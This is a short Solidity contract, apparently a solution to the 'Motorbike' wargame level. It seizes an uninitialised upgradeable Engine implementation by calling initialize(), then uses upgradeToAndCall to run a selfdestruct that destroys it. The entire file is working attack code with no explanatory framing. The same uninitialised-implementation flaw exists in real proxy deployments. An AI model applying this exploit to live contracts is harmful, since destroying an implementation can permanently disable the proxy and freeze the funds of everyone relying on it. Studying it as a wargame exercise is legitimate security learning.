// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "./Motorbike.sol";

contract AttackMotorbike {
    Engine immutable victim;

    constructor(address _victim) public {
        victim = Engine(payable(_victim));
    }

    function attack() external {
        victim.initialize();
        victim.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() external {
        selfdestruct(payable(address(0)));
    }
}
